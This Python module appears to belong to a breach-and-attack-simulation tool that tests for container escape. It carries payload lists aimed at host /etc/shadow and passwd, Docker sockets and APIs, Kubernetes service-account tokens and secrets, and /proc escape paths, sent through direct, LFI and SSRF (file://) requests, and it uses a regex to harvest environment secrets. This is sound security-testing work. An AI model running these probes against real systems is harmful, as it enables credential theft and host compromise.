"""
Container Escape testing module.

Tests for container breakout vectors: exposed Docker socket, mounted host
filesystems, privileged container detection, Kubernetes service-account
token access, /proc filesystem escapes, and environment variable leakage.

MITRE ATT&CK: T1611 - Escape to Host
"""

from __future__ import annotations

import re
import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# ── Docker socket exposure checks ─────────────────────────────────────────────
DOCKER_SOCKET_PAYLOADS = [
    # Direct socket probes via HTTP over unix socket (target must be the host)
    {"path": "/var/run/docker.sock", "check": "file", "desc": "Docker socket exposed at default path"},
    {"path": "/run/docker.sock", "check": "file", "desc": "Docker socket at /run/docker.sock"},
    {"path": "/var/run/docker.sock.bak", "check": "file", "desc": "Docker socket backup"},
    # Docker API via TCP (misconfigured daemon)
    {"path": "/version", "check": "api", "desc": "Docker API /version endpoint"},
    {"path": "/info", "check": "api", "desc": "Docker API /info endpoint"},
    {"path": "/containers/json", "check": "api", "desc": "Docker API container list"},
    {"path": "/images/json", "check": "api", "desc": "Docker API image list"},
    {"path": "/networks", "check": "api", "desc": "Docker API network list"},
    {"path": "/volumes", "check": "api", "desc": "Docker API volume list"},
    {"path": "/events", "check": "api", "desc": "Docker API events stream"},
    {"path": "/_ping", "check": "api", "desc": "Docker API ping"},
    {"path": "/v1.24/containers/json", "check": "api", "desc": "Docker API v1.24 container list"},
    {"path": "/v1.40/containers/json", "check": "api", "desc": "Docker API v1.40 container list"},
    {"path": "/v1.41/info", "check": "api", "desc": "Docker API v1.41 info"},
]

# ── Host filesystem mount detection ────────────────────────────────────────────
HOST_FS_PAYLOADS = [
    {"path": "/proc/1/cgroup", "check": "file", "desc": "cgroup info – detect container runtime"},
    {"path": "/proc/self/cgroup", "check": "file", "desc": "Self cgroup – container detection"},
    {"path": "/proc/1/status", "check": "file", "desc": "PID 1 status – host init process check"},
    {"path": "/proc/self/mountinfo", "check": "file", "desc": "Mount namespace info"},
    {"path": "/proc/self/status", "check": "file", "desc": "Self process status"},
    {"path": "/etc/hostname", "check": "file", "desc": "Container hostname (short hash = container)"},
    {"path": "/.dockerenv", "check": "file", "desc": ".dockerenv existence confirms Docker container"},
    {"path": "/run/secrets/kubernetes.io/serviceaccount/token", "check": "file",
     "desc": "K8s service account token mounted"},
    {"path": "/proc/1/environ", "check": "file", "desc": "PID 1 environment – may contain host secrets"},
    {"path": "/proc/self/environ", "check": "file", "desc": "Process environment variables"},
    {"path": "/etc/mtab", "check": "file", "desc": "Mount table – detect host mounts"},
    {"path": "/etc/resolv.conf", "check": "file", "desc": "DNS config – host DNS or container DNS"},
    {"path": "/host/etc/shadow", "check": "file", "desc": "Host /etc/shadow via volume mount"},
    {"path": "/host/etc/passwd", "check": "file", "desc": "Host /etc/passwd via volume mount"},
    {"path": "/hostfs/etc/passwd", "check": "file", "desc": "Host filesystem mounted at /hostfs"},
    {"path": "/mnt/etc/passwd", "check": "file", "desc": "Host filesystem mounted at /mnt"},
]

# ── Privileged container detection ─────────────────────────────────────────────
PRIVILEGED_PAYLOADS = [
    {"path": "/dev/sda", "check": "file", "desc": "Block device access – privileged container"},
    {"path": "/dev/sda1", "check": "file", "desc": "Block device partition access"},
    {"path": "/dev/mem", "check": "file", "desc": "/dev/mem access – full memory read"},
    {"path": "/dev/kmsg", "check": "file", "desc": "Kernel message buffer accessible"},
    {"path": "/sys/kernel/security", "check": "file", "desc": "Kernel security dir – privileged"},
    {"path": "/sys/fs/cgroup", "check": "file", "desc": "cgroup filesystem writable – privileged"},
    {"path": "/proc/sysrq-trigger", "check": "file", "desc": "SysRq trigger – privileged container"},
    {"path": "/proc/kcore", "check": "file", "desc": "Kernel memory – privileged container"},
    {"path": "/sys/module", "check": "file", "desc": "Kernel module loading – privileged"},
]

# ── Kubernetes-specific checks ─────────────────────────────────────────────────
K8S_PAYLOADS = [
    {"path": "/run/secrets/kubernetes.io/serviceaccount/token", "check": "file",
     "desc": "K8s SA token – may allow API server access"},
    {"path": "/run/secrets/kubernetes.io/serviceaccount/ca.crt", "check": "file",
     "desc": "K8s CA cert – verifies cluster CA"},
    {"path": "/run/secrets/kubernetes.io/serviceaccount/namespace", "check": "file",
     "desc": "K8s namespace file"},
    # K8s API server probes (when KUBERNETES_SERVICE_HOST is set)
    {"path": "/api/v1/namespaces", "check": "k8s_api", "desc": "K8s API – namespace list"},
    {"path": "/api/v1/pods", "check": "k8s_api", "desc": "K8s API – pod list"},
    {"path": "/api/v1/secrets", "check": "k8s_api", "desc": "K8s API – secret list"},
    {"path": "/api/v1/configmaps", "check": "k8s_api", "desc": "K8s API – configmap list"},
    {"path": "/apis/apps/v1/deployments", "check": "k8s_api", "desc": "K8s API – deployment list"},
    {"path": "/api/v1/nodes", "check": "k8s_api", "desc": "K8s API – node list"},
    {"path": "/version", "check": "k8s_api", "desc": "K8s API – server version"},
    {"path": "/healthz", "check": "k8s_api", "desc": "K8s API – health check"},
    {"path": "/apis", "check": "k8s_api", "desc": "K8s API – API group list"},
]

# ── /proc escape vectors ──────────────────────────────────────────────────────
PROC_ESCAPE_PAYLOADS = [
    {"path": "/proc/self/root", "check": "file", "desc": "/proc/self/root symlink escape"},
    {"path": "/proc/1/root", "check": "file", "desc": "/proc/1/root – host root via PID 1"},
    {"path": "/proc/1/root/etc/shadow", "check": "file",
     "desc": "Host shadow file via /proc/1/root"},
    {"path": "/proc/1/root/etc/passwd", "check": "file",
     "desc": "Host passwd via /proc/1/root"},
    {"path": "/proc/self/fd", "check": "file", "desc": "File descriptor listing"},
    {"path": "/proc/sched_debug", "check": "file", "desc": "Scheduler debug – host process list"},
    {"path": "/proc/timer_list", "check": "file", "desc": "Kernel timer list – host information"},
    {"path": "/sys/kernel/uevent_helper", "check": "file",
     "desc": "uevent_helper – writable = container escape"},
    {"path": "/sys/fs/cgroup/*/release_agent", "check": "file",
     "desc": "cgroup release_agent – CVE-2022-0492 escape vector"},
]

# ── Environment variable leak ─────────────────────────────────────────────────
ENV_LEAK_PATHS = [
    "/proc/self/environ",
    "/proc/1/environ",
    "/proc/self/cmdline",
    "/proc/1/cmdline",
]


def _all_payload_strings() -> list[str]:
    """Flatten all checks to simple path strings for the payload interface."""
    paths: list[str] = []
    for group in (
        DOCKER_SOCKET_PAYLOADS,
        HOST_FS_PAYLOADS,
        PRIVILEGED_PAYLOADS,
        K8S_PAYLOADS,
        PROC_ESCAPE_PAYLOADS,
    ):
        for entry in group:
            paths.append(entry["path"])
    paths.extend(ENV_LEAK_PATHS)
    return paths


ALL_CONTAINER_PAYLOADS = _all_payload_strings()

# Lookup table: path -> (check_type, description)
_PAYLOAD_LOOKUP: dict[str, tuple[str, str]] = {}
for _group in (DOCKER_SOCKET_PAYLOADS, HOST_FS_PAYLOADS, PRIVILEGED_PAYLOADS, K8S_PAYLOADS, PROC_ESCAPE_PAYLOADS):
    for _entry in _group:
        _PAYLOAD_LOOKUP[_entry["path"]] = (_entry["check"], _entry["desc"])
for _env_path in ENV_LEAK_PATHS:
    _PAYLOAD_LOOKUP[_env_path] = ("file", f"Environment / cmdline leak via {_env_path}")


class ContainerEscapeModule(BaseAttackModule):
    """
    Container escape and breakout testing.

    Tests for Docker socket exposure, host filesystem mounts, privileged
    container detection, Kubernetes service-account token access,
    /proc filesystem escapes, and environment variable leakage.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="container_escape",
            description=(
                "Container escape testing – Docker socket, host FS mounts, "
                "privileged detection, K8s SA tokens, /proc escapes"
            ),
            category="infrastructure",
            mitre_technique_ids=["T1611"],
            mitre_technique_names=["Escape to Host"],
            auth_level_required=AuthorizationLevel.AGGRESSIVE,
            owasp_category="",
            cwe_ids=["CWE-250", "CWE-269"],
            tags=["container", "docker", "kubernetes", "escape", "privilege", "infrastructure"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("container_escape", limit=200)
            if db_payloads:
                return db_payloads
        return ALL_CONTAINER_PAYLOADS

    def _build_requests(
        self, target: str, payloads: list[str], options: dict[str, Any]
    ) -> list[AttackRequest]:
        requests: list[AttackRequest] = []
        docker_api_host = options.get("docker_api", None)  # e.g. "http://host:2375"
        k8s_api_host = options.get("k8s_api", None)        # e.g. "https://10.96.0.1:443"
        k8s_token = options.get("k8s_token", "")
        use_ssrf = options.get("ssrf_mode", False)
        ssrf_param = options.get("ssrf_param", "url")

        for path in payloads:
            req_id = str(uuid.uuid4())[:8]
            check_type, desc = _PAYLOAD_LOOKUP.get(path, ("file", path))
            headers: dict[str, str] = {"X-BAS-Payload": path, "X-BAS-Check": check_type}

            if check_type == "api":
                # Docker API endpoint probe
                api_target = docker_api_host or target
                if use_ssrf:
                    requests.append(AttackRequest(
                        request_id=f"ctr-ssrf-{req_id}",
                        target=target,
                        method="GET",
                        path=options.get("path", "/"),
                        params={ssrf_param: f"{api_target}{path}"},
                        headers=headers,
                        timeout=options.get("timeout", 10.0),
                        follow_redirects=False,
                    ))
                else:
                    requests.append(AttackRequest(
                        request_id=f"ctr-docker-{req_id}",
                        target=api_target,
                        method="GET",
                        path=path,
                        headers=headers,
                        timeout=options.get("timeout", 10.0),
                        follow_redirects=False,
                    ))

            elif check_type == "k8s_api":
                api_target = k8s_api_host or "https://kubernetes.default.svc"
                k8s_headers = {**headers}
                if k8s_token:
                    k8s_headers["Authorization"] = f"Bearer {k8s_token}"
                requests.append(AttackRequest(
                    request_id=f"ctr-k8s-{req_id}",
                    target=api_target,
                    method="GET",
                    path=path,
                    headers=k8s_headers,
                    timeout=options.get("timeout", 10.0),
                    follow_redirects=False,
                ))

            else:
                # File-based checks – probe via web endpoint (LFI / SSRF style)
                if use_ssrf:
                    requests.append(AttackRequest(
                        request_id=f"ctr-ssrf-{req_id}",
                        target=target,
                        method="GET",
                        path=options.get("path", "/"),
                        params={ssrf_param: f"file://{path}"},
                        headers=headers,
                        timeout=options.get("timeout", 10.0),
                        follow_redirects=False,
                    ))
                else:
                    requests.append(AttackRequest(
                        request_id=f"ctr-file-{req_id}",
                        target=target,
                        method="GET",
                        path=path,
                        headers=headers,
                        timeout=options.get("timeout", 10.0),
                        follow_redirects=False,
                    ))

        return requests

    def _analyze_response(
        self, request: AttackRequest, response: AttackResponse, payload: str
    ) -> ModuleResult:
        body = response.body_text
        payload_used = request.headers.get("X-BAS-Payload", payload)
        check_type = request.headers.get("X-BAS-Check", "file")
        _, desc = _PAYLOAD_LOOKUP.get(payload_used, ("file", payload_used))

        if response.error:
            return ModuleResult(
                module_name="container_escape",
                target=request.target,
                status=VulnStatus.NOT_VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"error": response.error},
            )

        # ── Docker API indicators ──────────────────────────────────────────
        docker_indicators = [
            ("ApiVersion", "Docker API accessible – full container control", "critical"),
            ("ContainersRunning", "Docker daemon info exposed", "critical"),
            ("DockerRootDir", "Docker root directory exposed", "critical"),
            ("\"Id\":", "Docker container/image listing accessible", "critical"),
            ("docker-init", "Docker API version endpoint accessible", "high"),
            ("OK", "Docker API ping responded", "high") if "/_ping" in payload_used else ("", "", ""),
        ]
        if check_type == "api":
            for indicator, ind_desc, severity in docker_indicators:
                if indicator and indicator in body:
                    return ModuleResult(
                        module_name="container_escape",
                        target=request.target,
                        status=VulnStatus.VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"Container escape vector: {ind_desc}",
                        severity=severity,
                        mitre_technique_id="T1611",
                        detail={"detection_type": "docker_api", "indicator": indicator},
                    )

        # ── Kubernetes API indicators ──────────────────────────────────────
        k8s_indicators = [
            ("\"kind\":\"NamespaceList\"", "K8s namespace list accessible", "critical"),
            ("\"kind\":\"PodList\"", "K8s pod list accessible", "critical"),
            ("\"kind\":\"SecretList\"", "K8s secrets accessible – credential exposure", "critical"),
            ("\"kind\":\"ConfigMapList\"", "K8s configmaps accessible", "high"),
            ("\"kind\":\"NodeList\"", "K8s node list accessible", "high"),
            ("\"kind\":\"DeploymentList\"", "K8s deployments accessible", "high"),
            ("\"kind\":\"APIGroupList\"", "K8s API accessible from container", "medium"),
            ("gitVersion", "K8s API version info disclosed", "medium"),
        ]
        if check_type == "k8s_api":
            for indicator, ind_desc, severity in k8s_indicators:
                if indicator in body:
                    return ModuleResult(
                        module_name="container_escape",
                        target=request.target,
                        status=VulnStatus.VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"K8s access from container: {ind_desc}",
                        severity=severity,
                        mitre_technique_id="T1611",
                        detail={"detection_type": "k8s_api", "indicator": indicator},
                    )

        # ── File-based container indicators ────────────────────────────────
        file_indicators = [
            ("root:x:0:0:", "Host /etc/passwd readable – filesystem escape", "critical"),
            ("root:$", "Host /etc/shadow readable – credential exposure", "critical"),
            ("docker", "Container cgroup detected", "medium"),
            ("containerd", "containerd runtime detected", "medium"),
            ("kubepods", "Kubernetes pod cgroup detected", "medium"),
            (".dockerenv", "Inside Docker container confirmed", "info"),
            ("overlay", "OverlayFS mount detected (container)", "info"),
        ]

        for indicator, ind_desc, severity in file_indicators:
            if indicator in body:
                return ModuleResult(
                    module_name="container_escape",
                    target=request.target,
                    status=VulnStatus.VULNERABLE if severity in ("critical", "high") else VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Container detection: {ind_desc}",
                    severity=severity,
                    mitre_technique_id="T1611",
                    detail={"detection_type": "file_probe", "indicator": indicator},
                )

        # K8s service-account token
        if "serviceaccount/token" in payload_used and response.status_code == 200 and len(body.strip()) > 10:
            return ModuleResult(
                module_name="container_escape",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                response_body_preview=body[:200],
                elapsed_ms=response.elapsed_ms,
                evidence="Kubernetes service account token accessible – potential cluster compromise",
                severity="critical",
                mitre_technique_id="T1611",
                detail={"detection_type": "k8s_sa_token"},
            )

        # Environment variable leak detection
        env_secrets_re = re.compile(
            r"(?i)(password|secret|api[_-]?key|token|database_url|"
            r"aws_secret|aws_access|private_key|db_pass|redis_url|"
            r"mongo_uri|connection_string)=\S+",
        )
        if payload_used in ENV_LEAK_PATHS or "environ" in payload_used:
            if response.status_code == 200 and len(body) > 0:
                secrets_found = env_secrets_re.findall(body)
                if secrets_found:
                    return ModuleResult(
                        module_name="container_escape",
                        target=request.target,
                        status=VulnStatus.VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"Environment variable secrets exposed: {', '.join(secrets_found[:5])}",
                        severity="critical",
                        mitre_technique_id="T1611",
                        detail={"detection_type": "env_leak", "secrets_count": len(secrets_found)},
                    )
                return ModuleResult(
                    module_name="container_escape",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence="Process environment readable – review for sensitive values",
                    severity="high",
                    mitre_technique_id="T1611",
                    detail={"detection_type": "env_leak"},
                )

        # Privileged device access
        if any(dev in payload_used for dev in ("/dev/sda", "/dev/mem", "/dev/kmsg")):
            if response.status_code == 200 and len(body) > 0:
                return ModuleResult(
                    module_name="container_escape",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:200],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Privileged device accessible: {payload_used} – container is privileged",
                    severity="critical",
                    mitre_technique_id="T1611",
                    detail={"detection_type": "privileged_device"},
                )

        return ModuleResult(
            module_name="container_escape",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload_used,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
        )
